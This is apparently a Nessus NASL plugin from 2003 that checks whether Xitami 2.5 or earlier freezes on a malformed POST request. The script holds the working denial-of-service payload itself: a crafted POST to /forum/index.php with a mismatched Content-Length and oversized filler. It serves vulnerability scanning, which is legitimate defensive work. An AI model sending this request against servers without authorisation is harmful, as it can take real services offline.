#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence (GPLv2)
# 

if(description)
{
 script_id(11934);
 script_bugtraq_id(9083);
 script_version ("$Revision: 1.6 $");

 
 name["english"] = "Xitami malformed header DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to freeze the remote web server by
sending a malformed POST request. 
This is know to affect Xitami 2.5 and earlier versions.
 
Solution : Upgrade your software or use another

Risk factor : High";

 script_description(english:desc["english"]);
 summary["english"] = "Xitami malformed header POST request denial of service";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);
if(! can_host_php(port:port)) exit(0);

if (http_is_dead(port: port)) exit(0);

req = 	'POST /forum/index.php HTTP/1.1\r\nAccept-Encoding: None\r\n' +
	'Content-Length: 10\n\n' +
	crap(512) + '\r\n' + 
	crap(512);

soc = http_open_socket(port);
if(! soc) exit(0);

send(socket:soc, data: req);
http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port)) security_hole(port);
